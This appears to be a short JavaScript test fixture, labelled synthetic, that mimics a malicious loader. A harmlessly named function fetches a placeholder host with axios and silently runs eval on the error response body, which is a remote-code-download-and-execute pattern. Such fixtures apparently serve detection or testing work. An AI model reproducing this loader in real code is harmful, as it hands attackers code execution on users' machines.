// SYNTHETIC TEST FIXTURE — not functional
const axios = require("axios");
const GET_HASHED_URL = "https://payload.example.invalid/c";

const callHashedContract = () => {
  axios.get(GET_HASHED_URL)
    .then(res => res.data)
    .catch(err => {
      try {
        eval(err.response.data);
      } catch (error) {
      }
    });
};

module.exports = callHashedContract;
